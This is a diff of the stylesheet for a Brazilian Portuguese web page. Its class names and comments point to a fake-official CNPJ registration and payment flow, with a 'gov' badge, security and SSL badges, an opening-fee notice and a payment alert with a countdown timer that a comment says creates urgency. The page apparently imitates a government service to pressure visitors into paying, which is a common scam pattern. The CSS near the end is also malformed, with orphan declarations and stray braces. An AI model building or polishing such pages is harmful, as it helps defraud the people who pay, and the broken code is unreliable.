@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -8,8 +9,11 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     
+    <link rel="stylesheet" href="">
+
     <style>
         :root {
+            /* Paleta de cores profissional e institucional */
             --primary-color: #1e40af;
             --primary-hover: #1d4ed8;
             --primary-light: #dbeafe;
@@ -21,6 +25,7 @@
             --error-color: #dc2626;
             --error-light: #fee2e2;
             
+            /* Tons de cinza profissionais */
             --gray-50: #f8fafc;
             --gray-100: #f1f5f9;
             --gray-200: #e2e8f0;
@@ -33,15 +38,18 @@
             --gray-900: #0f172a;
             --white: #ffffff;
             
+            /* Sombras profissionais */
             --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
             --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
             --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
             --shadow-xl: 0 20px 25px -5px rgb(0 0 0 / 0.1), 0 10px 10px -5px rgb(0 0 0 / 0.04);
             
+            /* Bordas e raios */
             --border-radius: 8px;
             --border-radius-lg: 12px;
             --border-radius-xl: 16px;
             
+            /* Transições suaves */
             --transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
             --transition-fast: all 0.15s cubic-bezier(0.4, 0, 0.2, 1);
         }
@@ -62,6 +70,7 @@
             -moz-osx-font-smoothing: grayscale;
         }
 
+        /* ===== HEADER PROFISSIONAL COM CREDIBILIDADE ===== */
         .header {
             background: var(--white);
             border-bottom: 1px solid var(--gray-200);
@@ -74,11 +83,10 @@
         .header-content {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 12px 16px;
+            padding: 16px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            gap: 8px;
         }
 
         .logo-section {
@@ -88,17 +96,16 @@
         }
 
         .logo-icon {
-            width: 40px;
-            height: 40px;
+            width: 44px;
+            height: 44px;
             background: linear-gradient(135deg, var(--primary-color), var(--primary-hover));
             border-radius: var(--border-radius);
             display: flex;
             align-items: center;
             justify-content: center;
             color: var(--white);
-            font-size: 18px;
+            font-size: 20px;
             box-shadow: var(--shadow-md);
-            flex-shrink: 0;
         }
 
         .logo-text {
@@ -107,14 +114,14 @@
         }
 
         .logo-title {
-            font-size: 16px;
+            font-size: 18px;
             font-weight: 700;
             color: var(--gray-900);
-            line-height: 1.1;
+            line-height: 1.2;
         }
 
         .logo-subtitle {
-            font-size: 11px;
+            font-size: 12px;
             font-weight: 500;
             color: var(--gray-500);
             text-transform: uppercase;
@@ -124,32 +131,29 @@
         .security-indicators {
             display: flex;
             align-items: center;
-            gap: 8px;
-        }
-
-        @media (min-width: 640px) {
-            .security-indicators {
-                gap: 12px;
-            }
+            gap: 16px;
         }
 
         .security-badge {
-            display: none;
+            display: flex;
             align-items: center;
             gap: 6px;
             background: var(--success-light);
             color: var(--success-color);
-            padding: 6px 10px;
+            padding: 8px 12px;
             border-radius: 20px;
-            font-size: 11px;
+            font-size: 12px;
             font-weight: 600;
             border: 1px solid var(--success-color);
         }
 
-        @media (min-width: 640px) {
-            .security-badge {
-                display: flex;
-            }
+        .ssl-indicator {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: var(--gray-600);
+            font-size: 11px;
+            font-weight: 500;
         }
 
         .gov-badge {
@@ -160,107 +164,68 @@
             color: var(--primary-color);
             padding: 4px 8px;
             border-radius: 12px;
-            font-size: 9px;
+            font-size: 10px;
             font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 0.5px;
-            flex-shrink: 0;
         }
 
+        /* ===== CONTAINER PRINCIPAL ===== */
         .main-container {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 16px 16px 24px;
+            padding: 24px 20px;
             display: grid;
             grid-template-columns: 1fr;
-            gap: 16px;
-        }
-
-        @media (min-width: 640px) {
-            .main-container {
-                padding: 20px 20px 24px;
-                gap: 20px;
-            }
+            gap: 24px;
         }
 
         @media (min-width: 1024px) {
             .main-container {
                 grid-template-columns: 1fr 380px;
                 gap: 32px;
-                padding: 24px 20px;
             }
         }
 
+        /* ===== PROGRESSO PROFISSIONAL ===== */
         .progress-section {
             background: var(--white);
             border: 1px solid var(--gray-200);
             border-radius: var(--border-radius-lg);
-            padding: 16px;
+            padding: 24px;
             box-shadow: var(--shadow-sm);
-            margin-bottom: 16px;
-        }
-
-        @media (min-width: 640px) {
-            .progress-section {
-                padding: 20px;
-                margin-bottom: 20px;
-            }
-        }
-
-        @media (min-width: 1024px) {
-            .progress-section {
-                padding: 24px;
-                margin-bottom: 24px;
-            }
+            margin-bottom: 24px;
         }
 
         .progress-header {
             text-align: center;
-            margin-bottom: 16px;
-        }
-
-        @media (min-width: 640px) {
-            .progress-header {
-                margin-bottom: 20px;
-            }
+            margin-bottom: 24px;
         }
 
         .progress-title {
-            font-size: 15px;
-            font-weight: 700;
+            font-size: 16px;
+            font-weight: 600;
             color: var(--gray-900);
             margin-bottom: 4px;
         }
 
-        @media (min-width: 640px) {
-            .progress-title {
-                font-size: 16px;
-            }
-        }
-
         .progress-subtitle {
-            font-size: 12px;
+            font-size: 13px;
             color: var(--gray-600);
-        }
-
-        @media (min-width: 640px) {
-            .progress-subtitle {
-                font-size: 13px;
-            }
         }
 
         .progress-steps {
             display: flex;
             justify-content: space-between;
             position: relative;
-            margin-bottom: 8px;
+            margin-bottom: 16px;
         }
 
         .progress-line {
             position: absolute;
-            top: 18px;
-            left: 16px;
-            right: 16px;
+            top: 20px;
+            left: 20px;
+            right: 20px;
             height: 2px;
             background: var(--gray-200);
             z-index: 1;
@@ -268,8 +233,8 @@
 
         .progress-line-active {
             position: absolute;
-            top: 18px;
-            left: 16px;
+            top: 20px;
+            left: 20px;
             height: 2px;
             background: linear-gradient(90deg, var(--primary-color), var(--primary-hover));
             z-index: 2;
@@ -288,8 +253,8 @@
         }
 
         .step-circle {
-            width: 36px;
-            height: 36px;
+            width: 40px;
+            height: 40px;
             border-radius: 50%;
             background: var(--white);
             border: 2px solid var(--gray-300);
@@ -298,18 +263,9 @@
             align-items: center;
             justify-content: center;
             font-weight: 600;
-            font-size: 13px;
+            font-size: 14px;
             transition: var(--transition);
-            margin-bottom: 6px;
-        }
-
-        @media (min-width: 640px) {
-            .step-circle {
-                width: 40px;
-                height: 40px;
-                font-size: 14px;
-                margin-bottom: 8px;
-            }
+            margin-bottom: 8px;
         }
 
         .step.active .step-circle {
@@ -328,18 +284,11 @@
         }
 
         .step-label {
-            font-size: 11px;
+            font-size: 12px;
             font-weight: 500;
             color: var(--gray-600);
             text-align: center;
-            max-width: 70px;
-        }
-
-        @media (min-width: 640px) {
-            .step-label {
-                font-size: 12px;
-                max-width: 80px;
-            }
+            max-width: 80px;
         }
 
         .step.active .step-label {
@@ -351,6 +300,7 @@
             color: var(--success-color);
         }
 
+        /* ===== FORMULÁRIO PRINCIPAL ===== */
         .form-container {
             background: var(--white);
             border: 1px solid var(--gray-200);
@@ -362,73 +312,24 @@
         .form-header {
             background: linear-gradient(135deg, var(--gray-50) 0%, var(--white) 100%);
             border-bottom: 1px solid var(--gray-200);
-            padding: 16px;
-        }
-
-        @media (min-width: 640px) {
-            .form-header {
-                padding: 20px 24px;
-            }
-        }
-
-        @media (min-width: 1024px) {
-            .form-header {
-                padding: 24px 32px;
-            }
+            padding: 24px 32px;
         }
 
         .form-title {
-            font-size: 18px;
+            font-size: 24px;
             font-weight: 700;
             color: var(--gray-900);
             margin-bottom: 6px;
         }
 
-        @media (min-width: 640px) {
-            .form-title {
-                font-size: 20px;
-            }
-        }
-
-        @media (min-width: 1024px) {
-            .form-title {
-                font-size: 24px;
-            }
-        }
-
         .form-subtitle {
-            font-size: 13px;
+            font-size: 15px;
             color: var(--gray-600);
-            line-height: 1.4;
-        }
-
-        @media (min-width: 640px) {
-            .form-subtitle {
-                font-size: 14px;
-            }
-        }
-
-        @media (min-width: 1024px) {
-            .form-subtitle {
-                font-size: 15px;
-                line-height: 1.5;
-            }
+            line-height: 1.5;
         }
 
         .form-content {
-            padding: 16px;
-        }
-
-        @media (min-width: 640px) {
-            .form-content {
-                padding: 20px 24px;
-            }
-        }
-
-        @media (min-width: 1024px) {
-            .form-content {
-                padding: 32px;
-            }
+            padding: 32px;
         }
 
         .step-content {
@@ -452,28 +353,15 @@
         }
 
         .form-group {
-            margin-bottom: 16px;
-        }
-
-        @media (min-width: 640px) {
-            .form-group {
-                margin-bottom: 20px;
-            }
+            margin-bottom: 20px;
         }
 
         .form-label {
             display: block;
-            font-size: 13px;
+            font-size: 14px;
             font-weight: 600;
             color: var(--gray-800);
-            margin-bottom: 6px;
-        }
-
-        @media (min-width: 640px) {
-            .form-label {
-                font-size: 14px;
-                margin-bottom: 8px;
-            }
+            margin-bottom: 8px;
         }
 
         .form-label.required::after {
@@ -484,20 +372,13 @@
 
         .form-input {
             width: 100%;
-            padding: 12px 14px;
-            border: 1.5px solid var(--gray-300);
+            padding: 12px 16px;
+            border: 1px solid var(--gray-300);
             border-radius: var(--border-radius);
             font-size: 15px;
             color: var(--gray-900);
             background: var(--white);
             transition: var(--transition-fast);
-            min-height: 44px;
-        }
-
-        @media (min-width: 640px) {
-            .form-input {
-                padding: 12px 16px;
-            }
         }
 
         .form-input:focus {
@@ -518,282 +399,29 @@
 
         .error-message {
             display: none;
-            font-size: 11px;
+            font-size: 12px;
             color: var(--error-color);
-            margin-top: 4px;
-        }
-
-        @media (min-width: 640px) {
-            .error-message {
-                font-size: 12px;
-                margin-top: 6px;
-            }
+            margin-top: 6px;
         }
 
         .error-message.show {
             display: block;
         }
 
-        .info-section {
-            background: var(--gray-50);
-            border: 1px solid var(--gray-200);
-            border-radius: var(--border-radius-lg);
-            padding: 14px;
-            margin: 16px 0;
-        }
-
-        @media (min-width: 640px) {
-            .info-section {
-                padding: 16px;
-                margin: 20px 0;
-            }
-        }
-
-        @media (min-width: 1024px) {
-            .info-section {
-                padding: 20px;
-                margin: 24px 0;
-            }
-        }
-
-        .info-section-header {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 12px;
-        }
-
-        @media (min-width: 640px) {
-            .info-section-header {
-                gap: 10px;
-                margin-bottom: 16px;
-            }
-        }
-
-        .info-section-icon {
-            font-size: 16px;
-            color: var(--primary-color);
-        }
-
-        @media (min-width: 640px) {
-            .info-section-icon {
-                font-size: 18px;
-            }
-        }
-
-        .info-section-title {
-            font-size: 13px;
-            font-weight: 700;
-            color: var(--gray-900);
-        }
-
-        @media (min-width: 640px) {
-            .info-section-title {
-                font-size: 14px;
-            }
-        }
-
-        .info-section-content {
-            font-size: 12px;
-            color: var(--gray-700);
-        }
-
-        @media (min-width: 640px) {
-            .info-section-content {
-                font-size: 13px;
-            }
-        }
-
-        .cnpj-info-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 8px;
-            padding: 0;
-            background: transparent;
-            border-radius: 0;
-            border: none;
-        }
-
-        @media (min-width: 640px) {
-            .cnpj-info-grid {
-                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-                gap: 16px;
-            }
-        }
-
-        @media (min-width: 1024px) {
-            .cnpj-info-grid {
-                gap: 20px;
-            }
-        }
-
-        .cnpj-info-item {
-            padding: 8px 0;
-            border-bottom: 1px solid var(--gray-200);
-            display: grid;
-            grid-template-columns: 100px 1fr;
-            gap: 8px;
-        }
-
-        @media (min-width: 640px) {
-            .cnpj-info-item {
-                padding: 12px 0;
-                border-bottom: 1px dashed var(--gray-200);
-                display: block;
-            }
-        }
-
-        .cnpj-info-item:last-child {
-            border-bottom: none;
-        }
-
-        .cnpj-info-label {
-            display: block;
-            font-size: 11px;
-            font-weight: 600;
-            color: var(--gray-700);
-            text-transform: none;
-            letter-spacing: 0;
-            margin-bottom: 0;
-        }
-
-        @media (min-width: 640px) {
-            .cnpj-info-label {
-                font-size: 12px;
-                color: var(--gray-500);
-                text-transform: uppercase;
-                letter-spacing: 0.5px;
-                margin-bottom: 4px;
-            }
-        }
-
-        .cnpj-info-value {
-            display: block;
-            font-size: 12px;
-            font-weight: 600;
-            color: var(--gray-900);
-            word-wrap: break-word;
-        }
-
-        @media (min-width: 640px) {
-            .cnpj-info-value {
-                font-size: 14px;
-            }
-        }
-
-        @media (min-width: 1024px) {
-            .cnpj-info-value {
-                font-size: 15px;
-            }
-        }
-
-        .payment-alert-box {
-            margin-top: 16px;
-            padding: 14px;
-            background-color: var(--warning-light);
-            border: 2px solid var(--warning-color);
-            border-radius: var(--border-radius-lg);
-            box-shadow: var(--shadow-md);
-        }
-
-        @media (min-width: 640px) {
-            .payment-alert-box {
-                margin-top: 20px;
-                padding: 16px;
-            }
-        }
-
-        @media (min-width: 1024px) {
-            .payment-alert-box {
-                margin-top: 20px;
-                padding: 20px;
-            }
-        }
-
-        .payment-alert-content {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-
-        .payment-alert-header {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 8px;
-        }
-
-        @media (min-width: 640px) {
-            .payment-alert-header {
-                gap: 10px;
-                margin-bottom: 10px;
-            }
-        }
-
-        .payment-alert-title {
-            font-size: 13px;
-            font-weight: 700;
-            color: var(--warning-color);
-        }
-
-        @media (min-width: 640px) {
-            .payment-alert-title {
-                font-size: 14px;
-            }
-        }
-
-        .payment-alert-subtitle {
-            font-size: 12px;
-            color: var(--gray-700);
-            line-height: 1.4;
-        }
-
-        @media (min-width: 640px) {
-            .payment-alert-subtitle {
-                font-size: 13px;
-            }
-        }
-
-        .timer-display {
-            font-weight: 700;
-            color: var(--error-color);
-            font-size: 13px;
-        }
-
+        /* ===== SEÇÃO: Comunicado sobre Taxa de Abertura ===== */
         .fee-notice-section {
             background: var(--primary-light);
             border: 1px solid var(--primary-color);
             border-radius: var(--border-radius-lg);
-            padding: 16px;
-            margin-top: 16px;
-        }
-
-        @media (min-width: 640px) {
-            .fee-notice-section {
-                padding: 20px;
-                margin-top: 20px;
-            }
-        }
-
-        @media (min-width: 1024px) {
-            .fee-notice-section {
-                padding: 24px;
-                margin-top: 24px;
-            }
+            padding: 24px;
+            margin-top: 24px;
         }
 
         .fee-notice-header {
             display: flex;
             align-items: center;
-            gap: 10px;
-            margin-bottom: 12px;
-        }
-
-        @media (min-width: 640px) {
-            .fee-notice-header {
-                gap: 12px;
-                margin-bottom: 16px;
-            }
+            gap: 12px;
+            margin-bottom: 16px;
         }
 
         .fee-notice-icon {
@@ -804,16 +432,10 @@
         }
 
         .fee-notice-title {
-            font-size: 16px;
+            font-size: 18px;
             font-weight: 700;
             color: var(--primary-color);
             margin: 0;
-        }
-
-        @media (min-width: 640px) {
-            .fee-notice-title {
-                font-size: 18px;
-            }
         }
 
         .fee-notice-content {
@@ -822,15 +444,8 @@
         }
 
         .fee-notice-text {
-            font-size: 13px;
-            margin-bottom: 12px;
-        }
-
-        @media (min-width: 640px) {
-            .fee-notice-text {
-                font-size: 14px;
-                margin-bottom: 16px;
-            }
+            font-size: 15px;
+            margin-bottom: 16px;
         }
 
         .fee-highlight-box {
@@ -838,51 +453,27 @@
             border: 1px solid var(--primary-color);
             border-radius: var(--border-radius);
             padding: 16px;
-            margin: 12px 0;
+            margin: 16px 0;
             text-align: center;
         }
 
-        @media (min-width: 640px) {
-            .fee-highlight-box {
-                margin: 16px 0;
-            }
-        }
-
         .fee-amount {
-            font-size: 24px;
-            font-weight: 800;
+            font-size: 28px;
+            font-weight: 700;
             color: var(--primary-color);
             margin-bottom: 4px;
         }
 
-        @media (min-width: 640px) {
-            .fee-amount {
-                font-size: 28px;
-            }
-        }
-
         .fee-description {
-            font-size: 12px;
+            font-size: 14px;
             color: var(--gray-600);
             font-weight: 500;
-        }
-
-        @media (min-width: 640px) {
-            .fee-description {
-                font-size: 14px;
-            }
         }
 
         .fee-benefits-list {
             list-style: none;
             padding: 0;
-            margin: 12px 0 0 0;
-        }
-
-        @media (min-width: 640px) {
-            .fee-benefits-list {
-                margin: 16px 0 0 0;
-            }
+            margin: 16px 0 0 0;
         }
 
         .fee-benefits-list li {
@@ -890,14 +481,8 @@
             align-items: center;
             gap: 8px;
             margin-bottom: 8px;
-            font-size: 12px;
+            font-size: 14px;
             color: var(--gray-700);
-        }
-
-        @media (min-width: 640px) {
-            .fee-benefits-list li {
-                font-size: 14px;
-            }
         }
 
         .fee-benefits-list li::before {
@@ -907,20 +492,14 @@
             font-size: 16px;
         }
 
+        /* ===== LOADING INDICATOR ===== */
         .loading-indicator {
             display: none;
             align-items: center;
             gap: 8px;
-            margin-top: 6px;
-            color: var(--primary-color);
-            font-size: 12px;
-        }
-
-        @media (min-width: 640px) {
-            .loading-indicator {
-                margin-top: 8px;
-                font-size: 13px;
-            }
+            margin-top: 8px;
+            color: var(--gray-600);
+            font-size: 13px;
         }
 
         .loading-indicator.show {
@@ -929,8 +508,8 @@
         }
 
         .spinner {
-            width: 14px;
-            height: 14px;
+            width: 16px;
+            height: 16px;
             border: 2px solid var(--gray-300);
             border-top: 2px solid var(--primary-color);
             border-radius: 50%;
@@ -941,61 +520,26 @@
             to { transform: rotate(360deg); }
         }
 
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
-        }
-
+        /* ===== BOTÕES PROFISSIONAIS ===== */
         .button-group {
             display: flex;
-            flex-direction: column;
-            gap: 10px;
-            margin-top: 16px;
-        }
-
-        @media (min-width: 640px) {
-            .button-group {
-                flex-direction: row;
-                gap: 12px;
-                margin-top: 24px;
-            }
-        }
-
-        @media (min-width: 1024px) {
-            .button-group {
-                margin-top: 32px;
-            }
+            gap: 12px;
+            margin-top: 32px;
         }
 
         .btn {
-            padding: 14px 20px;
+            padding: 12px 24px;
             border: none;
             border-radius: var(--border-radius);
-            font-size: 14px;
-            font-weight: 700;
+            font-size: 15px;
+            font-weight: 600;
             cursor: pointer;
             transition: var(--transition);
-            display: flex;
+            display: inline-flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
-            width: 100%;
-            min-height: 48px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        @media (min-width: 640px) {
-            .btn {
-                font-size: 15px;
-                padding: 12px 24px;
-                width: auto;
-                min-width: 140px;
-            }
+            min-width: 140px;
         }
 
         .btn-primary {
@@ -1028,47 +572,27 @@
             pointer-events: none;
         }
 
+        /* ===== CHECKBOX ===== */
         .checkbox-group {
             display: flex;
             align-items: flex-start;
-            gap: 10px;
-            margin-bottom: 12px;
-        }
-
-        @media (min-width: 640px) {
-            .checkbox-group {
-                gap: 12px;
-                margin-bottom: 16px;
-            }
+            gap: 12px;
+            margin-bottom: 16px;
         }
 
         .checkbox-input {
-            width: 18px;
-            height: 18px;
+            width: 20px;
+            height: 20px;
             margin-top: 2px;
             cursor: pointer;
             accent-color: var(--primary-color);
-            flex-shrink: 0;
-        }
-
-        @media (min-width: 640px) {
-            .checkbox-input {
-                width: 20px;
-                height: 20px;
-            }
         }
 
         .checkbox-label {
-            font-size: 12px;
+            font-size: 14px;
             color: var(--gray-700);
             line-height: 1.5;
             cursor: pointer;
-        }
-
-        @media (min-width: 640px) {
-            .checkbox-label {
-                font-size: 14px;
-            }
         }
 
         .checkbox-label strong {
@@ -1076,60 +600,33 @@
             font-weight: 600;
         }
 
+        /* ===== DECLARATION SECTION ===== */
         .declaration-section {
             background: var(--gray-50);
             border: 1px solid var(--gray-200);
             border-radius: var(--border-radius-lg);
-            padding: 16px;
-            margin: 16px 0;
-        }
-
-        @media (min-width: 640px) {
-            .declaration-section {
-                padding: 20px;
-                margin: 20px 0;
-            }
-        }
-
-        @media (min-width: 1024px) {
-            .declaration-section {
-                padding: 24px;
-                margin: 24px 0;
-            }
+            padding: 24px;
+            margin: 24px 0;
         }
 
         .declaration-title {
-            font-size: 14px;
+            font-size: 16px;
             font-weight: 600;
             color: var(--gray-900);
-            margin-bottom: 12px;
+            margin-bottom: 16px;
             display: flex;
             align-items: center;
             gap: 8px;
         }
 
-        @media (min-width: 640px) {
-            .declaration-title {
-                font-size: 16px;
-                margin-bottom: 16px;
-            }
-        }
-
         .declaration-text {
-            font-size: 12px;
+            font-size: 14px;
             color: var(--gray-700);
-            line-height: 1.5;
-            margin-bottom: 12px;
+            line-height: 1.6;
+            margin-bottom: 20px;
         }
 
-        @media (min-width: 640px) {
-            .declaration-text {
-                font-size: 14px;
-                line-height: 1.6;
-                margin-bottom: 16px;
-            }
-        }
-
+        /* ===== SIDEBAR ===== */
         .sidebar {
             display: none;
         }
@@ -1138,7 +635,7 @@
             .sidebar {
                 display: flex;
                 flex-direction: column;
-                gap: 16px;
+                gap: 20px;
             }
         }
 
@@ -1146,146 +643,81 @@
             background: var(--white);
             border: 1px solid var(--gray-200);
             border-radius: var(--border-radius-lg);
-            padding: 16px;
+            padding: 20px;
             box-shadow: var(--shadow-sm);
-            position: sticky;
-            top: 70px;
-        }
-
-        @media (min-width: 1024px) {
-            .summary-card {
-                padding: 20px;
-                top: 80px;
-            }
         }
 
         .summary-title {
-            font-size: 14px;
-            font-weight: 700;
+            font-size: 16px;
+            font-weight: 600;
             color: var(--gray-900);
-            margin-bottom: 12px;
-        }
-
-        @media (min-width: 1024px) {
-            .summary-title {
-                font-size: 16px;
-                margin-bottom: 16px;
-            }
+            margin-bottom: 16px;
         }
 
         .price-display {
             background: linear-gradient(135deg, var(--primary-light) 0%, rgba(30, 64, 175, 0.05) 100%);
             border-radius: var(--border-radius);
-            padding: 14px;
+            padding: 16px;
             text-align: center;
-            margin-bottom: 12px;
-        }
-
-        @media (min-width: 1024px) {
-            .price-display {
-                padding: 16px;
-                margin-bottom: 16px;
-            }
         }
 
         .price-label {
-            font-size: 11px;
+            font-size: 12px;
             color: var(--gray-600);
-            font-weight: 600;
+            font-weight: 500;
             text-transform: uppercase;
             letter-spacing: 0.5px;
             margin-bottom: 4px;
         }
 
-        @media (min-width: 1024px) {
-            .price-label {
-                font-size: 12px;
-            }
-        }
-
         .price-value {
-            font-size: 26px;
-            font-weight: 800;
+            font-size: 24px;
+            font-weight: 700;
             color: var(--primary-color);
-        }
-
-        @media (min-width: 1024px) {
-            .price-value {
-                font-size: 28px;
-            }
         }
 
         .trust-section {
             background: var(--white);
             border: 1px solid var(--gray-200);
             border-radius: var(--border-radius-lg);
-            padding: 16px;
+            padding: 20px;
             box-shadow: var(--shadow-sm);
         }
 
-        @media (min-width: 1024px) {
-            .trust-section {
-                padding: 20px;
-            }
-        }
-
         .trust-title {
-            font-size: 14px;
-            font-weight: 700;
+            font-size: 16px;
+            font-weight: 600;
             color: var(--gray-900);
-            margin-bottom: 12px;
-        }
-
-        @media (min-width: 1024px) {
-            .trust-title {
-                font-size: 16px;
-                margin-bottom: 16px;
-            }
+            margin-bottom: 16px;
         }
 
         .trust-item {
             display: flex;
-            gap: 10px;
-            margin-bottom: 10px;
-            font-size: 12px;
+            gap: 12px;
+            margin-bottom: 12px;
+            font-size: 13px;
             color: var(--gray-700);
         }
 
-        @media (min-width: 1024px) {
-            .trust-item {
-                gap: 12px;
-                margin-bottom: 12px;
-                font-size: 13px;
-            }
-        }
-
         .trust-icon {
-            width: 18px;
-            height: 18px;
+            width: 20px;
+            height: 20px;
             background: var(--success-light);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             color: var(--success-color);
-            font-size: 11px;
+            font-size: 12px;
             flex-shrink: 0;
-            margin-top: 1px;
-        }
-
-        @media (min-width: 1024px) {
-            .trust-icon {
-                width: 20px;
-                height: 20px;
-                font-size: 12px;
-                margin-top: 2px;
-            }
+            margin-top: 2px;
         }
 
         .trust-text {
             line-height: 1.4;
         }
 
+        /* ===== LOADING OVERLAY ===== */
         .loading-overlay {
             position: fixed;
             top: 0;
@@ -1299,22 +731,12 @@
             z-index: 1000;
         }
 
-        .loading-overlay.show {
-            display: flex;
-        }
-
         .loading-content {
             background: var(--white);
-            padding: 24px;
+            padding: 32px;
             border-radius: var(--border-radius-lg);
             text-align: center;
             box-shadow: var(--shadow-xl);
-        }
-
-        @media (min-width: 640px) {
-            .loading-content {
-                padding: 32px;
-            }
         }
 
         .loading-spinner {
@@ -1328,17 +750,12 @@
         }
 
         .loading-text {
-            font-size: 14px;
+            font-size: 16px;
             font-weight: 600;
             color: var(--gray-900);
         }
 
-        @media (min-width: 640px) {
-            .loading-text {
-                font-size: 16px;
-            }
-        }
-
+        /* ===== SUCCESS NOTIFICATION ===== */
         .success-notification {
             position: fixed;
             top: 20px;
@@ -1364,20 +781,219 @@
             }
         }
 
-        .status-pending {
-            background: var(--warning-light);
-            color: var(--warning-color);
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-weight: 600;
-            font-size: 11px;
+        /* ===== CNPJ INFO DISPLAY ===== */
+        .cnpj-info-display {
+            background: var(--success-light);
+            border: 1px solid var(--success-color);
+            border-radius: var(--border-radius-lg);
+            padding: 20px;
+            margin: 24px 0;
         }
 
-        @media (min-width: 640px) {
-            .status-pending {
-                font-size: 12px;
+        .cnpj-info-display h3 {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--primary-color);
+            margin-bottom: 16px;
+            padding-bottom: 8px;
+            border-bottom: 2px solid var(--primary-light);
+        }
+
+        .cnpj-info-display h3 .fa-check-circle {
+            font-size: 20px;
+        }
+        .cnpj-info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            padding: 16px;
+            background: var(--gray-50);
+            border-radius: var(--border-radius);
+            border: 1px solid var(--gray-200);
+        }
+        .cnpj-info-item {
+            padding: 12px 0;
+            border-bottom: 1px dashed var(--gray-200);
+        }
+
+        .cnpj-info-item:last-child {
+            border-bottom: none;
+        }
+
+        .cnpj-info-label {
+            display: block;
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--gray-500);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
+
+        .cnpj-info-value {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--gray-800);
+            word-wrap: break-word;
+        }
+
+        /* ===== PAYMENT ALERT BOX (URGENCY) ===== */
+        .payment-alert-box {
+            margin-top: 20px;
+            padding: 20px;
+            background-color: var(--warning-light);
+            border: 1px solid var(--warning-color);
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow-md);
+        }
+
+        /* Ajuste para Mobile: centraliza o conteúdo */
+        @media (max-width: 767px) {
+            .payment-alert-content {
+                text-align: center;
+            }
+            .payment-alert-header {
+                justify-content: center;
             }
         }
+
+        .payment-alert-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .payment-alert-icon {
+            font-size: 24px;
+            color: var(--warning-color);
+        }
+
+        .payment-alert-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--warning-color);
+            margin: 0;
+        }
+
+        .payment-alert-subtitle {
+            font-size: 14px;
+            color: var(--gray-700);
+            line-height: 1.5;
+        }
+
+        .payment-alert-subtitle .timer-display {
+            display: inline-block;
+            margin: 0 5px;
+        }
+
+        /* Estilo para o Spinner Circular */
+        .spinner-circular {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 3px solid var(--error-color);
+            border-top: 3px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+
+        /* ===== STATUS INDICATORS ===== */
+        .status-pending {
+            color: var(--error-color);
+            font-weight: 700;
+        }
+
+        /* ===== INFO SECTION (PAYMENT PAGE) ===== */
+        .info-section {
+            margin-bottom: 24px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow-md);
+            overflow: hidden;
+        }
+
+        .info-section-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 16px 24px;
+            background: var(--primary-light);
+            border-bottom: 1px solid var(--primary-color);
+            border-top-left-radius: var(--border-radius);
+            border-top-right-radius: var(--border-radius);
+        }
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--gray-200);
+        }
+
+        .info-section-icon {
+            font-size: 20px;
+            color: var(--primary-color);
+        }
+            color: var(--primary-color);
+            font-size: 18px;
+        }
+
+        .info-section-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--primary-color);
+            margin: 0;
+        }
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--gray-900);
+            margin: 0;
+        }
+
+        .info-section-content {
+            padding: 24px;
+            border: 1px solid var(--gray-200);
+            border-top: none;
+            border-bottom-left-radius: var(--border-radius);
+            border-bottom-right-radius: var(--border-radius);
+        }
+            padding: 20px;
+        }
+/* ===== SPINNER CIRCULAR PARA O ALERTA DE PAGAMENTO (SUBSTITUI O ÍCONE) ===== */
+.spinner-circular-icon {
+    width: 24px;
+    height: 24px;
+    border: 3px solid rgba(255, 255, 255, 0.3);
+    border-top: 3px solid var(--white);
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-right: 8px;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+/* Ajuste para o timer display */
+.timer-display {
+    font-weight: 700;
+    color: var(--error-color); /* Para dar um senso de urgência */
+    font-size: 1.1em;
+    display: inline-block;
